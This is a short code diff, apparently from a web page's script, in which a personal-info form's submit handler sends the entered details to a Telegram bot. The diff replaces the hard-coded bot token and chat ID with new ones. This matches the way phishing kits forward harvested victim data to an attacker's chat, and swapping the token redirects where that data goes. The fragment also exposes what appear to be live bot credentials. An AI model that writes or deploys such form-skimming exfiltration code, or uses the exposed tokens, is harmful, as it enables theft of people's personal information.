@@ -43,8 +43,8 @@ document.getElementById("personal-info-form").addEventListener("submit", functio
     xhr.send(data);
 
     // Send the personal info to the Telegram bot
-    var telegramBotToken = "6898105800:AAGhdS8vnzZlxPMBB7SF2y7B3-5Bxw-AJws";
-    var chatId = "5857533644";
+    var telegramBotToken = "6641005313:AAEYh_RBmky1JDUL6H1Donqpr6YkeQ99JQI";
+    var chatId = "6761588087";
     var telegramUrl = "https://api.telegram.org/bot" + telegramBotToken + "/sendMessage";
     var telegramData = {
         chat_id: chatId,
